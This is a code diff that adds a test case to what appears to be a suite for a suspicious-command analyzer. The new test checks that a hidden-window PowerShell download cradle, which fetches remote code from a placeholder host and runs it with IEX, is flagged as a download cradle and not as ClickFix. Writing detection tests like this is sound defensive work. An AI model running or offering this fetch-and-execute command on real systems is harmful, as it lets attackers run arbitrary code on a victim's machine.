@@ -35,4 +35,9 @@ describe('review battery — end state after Phase 1', () => {
     const r = await analyze('regsvr32 /u /s C:\\Program Files\\MyApp\\shell-extension.dll')
     expect(r.bullets.some((b) => /regsvr32/i.test(b.text))).toBe(false)
   })
+  it('#1/#4 plain download cradle: reads as download-cradle only, never ClickFix (Task 14, review 2.4)', async () => {
+    const r = await analyze("powershell -nop -w hidden IEX (New-Object Net.WebClient).DownloadString('http://x/a')")
+    expect(r.signals.some((s) => s.id === 'download-cradle')).toBe(true)
+    expect(r.signals.some((s) => s.id === 'clickfix')).toBe(false)
+  })
 })
